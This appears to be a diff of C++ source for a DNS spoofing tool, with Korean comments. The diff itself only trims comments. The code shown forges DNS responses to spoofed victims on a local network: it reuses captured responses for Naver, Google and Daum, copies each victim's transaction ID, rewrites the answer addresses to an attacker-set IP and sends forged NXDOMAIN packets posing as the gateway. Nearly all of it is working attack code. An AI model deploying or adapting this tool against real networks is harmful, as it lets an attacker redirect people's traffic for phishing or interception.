@@ -32,7 +32,6 @@ DnsSpoofer::~DnsSpoofer()
 bool DnsSpoofer::load_dns_response_template(const string& filename, vector<vector<uint8_t>>& templates) 
 {
     char errbuf[PCAP_ERRBUF_SIZE];
-    // pcap 파일을 오프라인 모드로 엽니다.
     pcap_t* pcap_handle = pcap_open_offline(filename.c_str(), errbuf);
     if (!pcap_handle) 
     {
@@ -42,10 +41,10 @@ bool DnsSpoofer::load_dns_response_template(const string& filename, vector<vecto
     struct pcap_pkthdr* header;
     const u_char* packet;
     int res;
-    // pcap 파일에서 하나씩 패킷을 읽습니다.
+    // pcap 파일 하나씩 읽음
     while ((res = pcap_next_ex(pcap_handle, &header, &packet)) >= 0) 
     {
-        // 시간 초과(res == 0) 또는 패킷 길이가 이더넷 헤더보다 짧은 경우 건너뜁니다.
+        // 시간 초과(res == 0) 또는 패킷 길이가 이더넷 헤더보다 짧은 경우 SKIP
         if (res == 0 || header->caplen < 14) 
         {
             continue;
@@ -71,7 +70,7 @@ bool DnsSpoofer::load_dns_response_template(const string& filename, vector<vecto
         {
             continue;
         }
-        // 전체 패킷을 템플릿 리스트에 저장합니다.
+        // 전체 패킷을 템플릿 리스트에 저장
         templates.emplace_back(packet, packet + header->caplen);
     }
     pcap_close(pcap_handle);
@@ -108,14 +107,14 @@ void DnsSpoofer::cache_template_packet(const vector<uint8_t>& packet, const stri
     cache_entry.packet = packet;
     // DNS 데이터는 이더넷, IP, UDP 헤더 이후부터 시작함.
     const uint8_t* dns_data = packet.data() + eth_len + ip_header_len + sizeof(struct udphdr);
-    // DNS 헤더는 12바이트이므로 그 이후가 질문 섹션입니다.
+    // DNS 헤더는 12바이트이므로 그 이후가 질문 섹션
     const uint8_t* qptr = dns_data + 12;
-    // 질문 섹션을 순회하며 도메인 이름을 건너뜁니다.
+    // 질문 섹션을 순회하며 도메인명 부분을 건너뜀 (인자로 받아옴)
     while (*qptr != 0 && (qptr - dns_data) < (packet.size() - (eth_len + ip_header_len + sizeof(struct udphdr)))) {
         qptr += (*qptr) + 1;
     }
-    qptr++; // null 바이트 건너뛰기
-    // 그 다음 2바이트가 질문 타입(qtype)입니다.
+    qptr++; // null 바이트
+    // 그 다음 2바이트가 질문 타입(qtype)
     cache_entry.qtype = ntohs(*(uint16_t*)qptr);
     cache_entry.is_response = is_response;
     
@@ -125,7 +124,7 @@ void DnsSpoofer::cache_template_packet(const vector<uint8_t>& packet, const stri
         c = tolower(c);
     }
     
-    // 해당 도메인 이름을 키로 캐시 맵에 추가합니다.
+    // 해당 도메인 이름을 키로 캐시 맵에 추가
     template_cache[normalized_domain].push_back(move(cache_entry));
 }
 
@@ -143,7 +142,7 @@ bool DnsSpoofer::initialize_templates(const string& naver_path,
     if (!load_dns_response_template(daum_path, daum_templates))
         success = false;
     
-    // 각 도메인별로 캐시에 템플릿을 저장합니다.
+    // 각 도메인별로 캐시에 템플릿을 저장
     for (const auto& packet : naver_templates)
         cache_template_packet(packet, "www.naver.com");
     for (const auto& packet : google_templates)
@@ -195,13 +194,13 @@ void DnsSpoofer::send_spoof_response(pcap_t* handle,
     const uint8_t* query_data = orig_packet + eth_len + ip_header_len + sizeof(struct udphdr);
     size_t query_len = orig_packet_len - (eth_len + ip_header_len + sizeof(struct udphdr));
     
-    // DNS 질문 섹션 시작 후 12바이트를 건너뛴 뒤, 도메인 이름 및 질문 타입이 위치합니다.
+    // DNS 도메인 이름 및 질문 타입
     uint8_t* qptr = const_cast<uint8_t*>(query_data) + 12;
     while (*qptr != 0 && (qptr - query_data) < query_len)
     {
         qptr += (*qptr) + 1;
     }
-    qptr++; // null 바이트 건너뛰기
+    qptr++; // null 바이트
     // 질문 타입 추출 (2바이트)
     uint16_t qtype = ntohs(*(uint16_t*)qptr);
     
@@ -224,7 +223,7 @@ void DnsSpoofer::send_spoof_response(pcap_t* handle,
     memcpy(requester_ip, &orig_ip->ip_src, 4);
     uint8_t requester_mac[6] = {0};
     bool found_target = false;
-    // 원본 패킷의 IP 소스와 일치하는 스푸핑 대상의 MAC 주소를 찾습니다.
+    // 스푸핑 대상의 MAC 주소
     for (const auto& target : targets) 
     {
         if (ip_equals(requester_ip, target->get_ip())) 
@@ -241,22 +240,22 @@ void DnsSpoofer::send_spoof_response(pcap_t* handle,
         return;
     }
     
-    // 템플릿들 중, 질문 타입과 매칭되는 템플릿을 찾습니다.
+    // 템플릿들 중, 질문 타입과 매칭되는 템플릿 확인
     for (const auto& cache_entry : templates) 
     {
         if (qtype == cache_entry.qtype || (qtype == 1 && cache_entry.qtype == 1) || (qtype == 65 && cache_entry.qtype == 65))
         {
             template_found = true;
-            // 선택된 템플릿 패킷을 로컬 버퍼에 복사합니다.
+            // 선택된 템플릿 패킷을 로컬 버퍼에 복사
             vector<uint8_t> local_packet_buffer(cache_entry.packet);
             size_t spoof_packet_size = local_packet_buffer.size();
             
-            // Ethernet 헤더 수정: 공격자 MAC을 출발지로, 대상 MAC을 목적지로 설정합니다.
+            // Ethernet 헤더 공격자 MAC을 출발지로, 대상 MAC을 목적지로 설정
             struct ether_header* eth_resp = reinterpret_cast<struct ether_header*>(local_packet_buffer.data());
             memcpy(eth_resp->ether_shost, attacker_mac, 6);
             memcpy(eth_resp->ether_dhost, requester_mac, 6);
             
-            // IP 헤더 수정: 원본 IP 헤더를 참조하여 출발지와 목적지를 스왑합니다.
+            //  원본 IP 헤더를 참조하여 출발지와 목적지를 스왑
             struct ip* ip_resp = reinterpret_cast<struct ip*>(local_packet_buffer.data() + eth_len);
             ip_resp->ip_src = orig_ip->ip_dst;
             ip_resp->ip_dst = orig_ip->ip_src;
@@ -270,21 +269,21 @@ void DnsSpoofer::send_spoof_response(pcap_t* handle,
                 ip_sum = (ip_sum & 0xFFFF) + (ip_sum >> 16);
             ip_resp->ip_sum = htons(~ip_sum);
             
-            // UDP 헤더 수정: 포트 번호를 스왑합니다.
+            // UDP 헤더 포트 번호를 스왑
             struct udphdr* udp_resp = reinterpret_cast<struct udphdr*>(local_packet_buffer.data() + eth_len + ip_resp->ip_hl * 4);
             udp_resp->uh_sport = orig_udp->uh_dport;
             udp_resp->uh_dport = orig_udp->uh_sport;
             udp_resp->uh_sum = 0;
             
-            // DNS 헤더 수정: 트랜잭션 ID를 원본과 일치시킵니다.
+            // 트랜잭션 ID를 원본과 일치
             dns_hdr* dns_resp = reinterpret_cast<dns_hdr*>(local_packet_buffer.data() + eth_len + ip_resp->ip_hl * 4 + sizeof(struct udphdr));
             dns_resp->id = orig_dns->id;
             
-            // 스푸핑 IP 주소 설정: main.cpp에서 setSpoofIP()를 통해 설정된 값을 사용합니다.
+            // 스푸핑 IP 주소 설정
             uint32_t new_ip;
             inet_pton(AF_INET, spoof_ip.c_str(), &new_ip);
             
-            // DNS 응답 데이터 부분에서 IP 주소를 새 스푸핑 IP로 대체합니다.
+            // DNS 응답 데이터 부분에서 IP 주소를 스푸핑 IP로 대체
             uint8_t* dns_data = reinterpret_cast<uint8_t*>(dns_resp);
             size_t dns_len = spoof_packet_size - (eth_len + ip_resp->ip_hl * 4 + sizeof(struct udphdr));
             uint8_t* current = dns_data + sizeof(dns_hdr);
@@ -308,7 +307,7 @@ void DnsSpoofer::send_spoof_response(pcap_t* handle,
                 current += 10 + rdlength;
             }
             
-            // 전송: 수정된 스푸핑 응답 패킷을 전송합니다.
+            // 전송: 수정된 스푸핑 응답 패킷을 전송
             if (pcap_sendpacket(handle, local_packet_buffer.data(), spoof_packet_size) != 0) 
             {
                 cerr << "DNS 스푸핑 응답 전송 실패: " << pcap_geterr(handle) << endl;
@@ -353,17 +352,17 @@ void DnsSpoofer::send_recovery_responses(pcap_t* handle,
                     vector<uint8_t> nxdomain_packet = cache_entry.packet;
                     const int eth_len = 14;
 
-                    // 수정: Ethernet 헤더에서 공격자/대상 MAC 주소를 설정합니다.
+                    // Ethernet 헤더에서 공격자/대상 MAC 주소를 설정
                     struct ether_header* eth_nx = reinterpret_cast<struct ether_header*>(nxdomain_packet.data());
                     memcpy(eth_nx->ether_shost, attacker_mac, 6);
                     memcpy(eth_nx->ether_dhost, target->get_mac(), 6);
 
-                    // 수정: IP 헤더를 수정하여, 게이트웨이 IP를 출발지, 대상의 IP를 목적지로 설정하고 TTL을 0으로 지정합니다.
+                    // IP 헤더를 수정하여, 게이트웨이 IP를 출발지, 대상의 IP를 목적지로 설정하고 TTL을 0으로 지정
                     struct ip* ip_nx = reinterpret_cast<struct ip*>(nxdomain_packet.data() + eth_len);
                     int ip_header_len = ip_nx->ip_hl * 4;
                     memcpy(&ip_nx->ip_src, gateway_ip, 4);
                     memcpy(&ip_nx->ip_dst, target->get_ip(), 4);
-                    ip_nx->ip_ttl = 0; // TTL을 0으로 설정
+                    ip_nx->ip_ttl = 0; // TTL 
                     ip_nx->ip_id = htons(rand() % 65536);
                     ip_nx->ip_sum = 0;
                     uint16_t* ip_words = reinterpret_cast<uint16_t*>(ip_nx);
@@ -375,7 +374,7 @@ void DnsSpoofer::send_recovery_responses(pcap_t* handle,
                         ip_sum = (ip_sum & 0xFFFF) + (ip_sum >> 16);
                     ip_nx->ip_sum = htons(~ip_sum);
                     
-                    // 수정: UDP 헤더 및 DNS 헤더 설정 (재전송을 위한 랜덤 ID 및 NXDOMAIN 플래그 설정)
+                    // UDP 헤더 및 DNS 헤더 설정 (재전송을 위한 랜덤 ID 및 NXDOMAIN 플래그 설정)
                     struct udphdr* udp_nx = reinterpret_cast<struct udphdr*>(nxdomain_packet.data() + eth_len + ip_header_len);
                     dns_hdr* dns_nx = reinterpret_cast<dns_hdr*>(nxdomain_packet.data() + eth_len + ip_header_len + sizeof(struct udphdr));
                     dns_nx->id = htons(rand() % 65535);
@@ -384,7 +383,7 @@ void DnsSpoofer::send_recovery_responses(pcap_t* handle,
                     dns_nx->flags = htons(flags);
                     dns_nx->ancount = 0; // NXDOMAIN 응답은 정답 섹션이 없음.
                     
-                    // NXDOMAIN 패킷을 3회 전송합니다.
+                    // NXDOMAIN 패킷 3회 전송
                     for (int i = 0; i < 3; i++) {
                         if (pcap_sendpacket(handle, nxdomain_packet.data(), nxdomain_packet.size()) != 0)
                             cerr << "NXDOMAIN 패킷 전송 실패: " << pcap_geterr(handle) << endl;
